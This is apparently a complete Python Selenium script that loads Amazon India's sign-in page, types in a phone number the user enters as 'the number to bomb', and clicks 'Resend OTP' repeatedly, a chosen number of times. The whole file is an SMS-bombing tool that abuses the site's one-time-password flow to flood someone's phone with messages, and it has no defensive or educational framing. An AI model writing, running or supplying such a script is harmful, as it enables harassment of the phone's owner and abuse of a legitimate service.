from selenium import webdriver

webpage = webdriver.Chrome("Chromedriver.exe")

webpage.get("https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.in%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=inflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&")

user_number = input("Enter the number to bomb: ")
user_times = input("How many messages to be sent: ")

number = webpage.find_element_by_id("ap_email")
num = int(user_number)
number.send_keys(num)

btn_continue = webpage.find_element_by_id("continue")
btn_continue.click()

otp_click = webpage.find_element_by_xpath('//input[@id="continue"]')
otp_click.click()

count = int(user_times)

for i in range(count):
    btn_resend = webpage.find_element_by_xpath('//a[contains(text(),"Resend OTP")]')
    btn_resend.click()
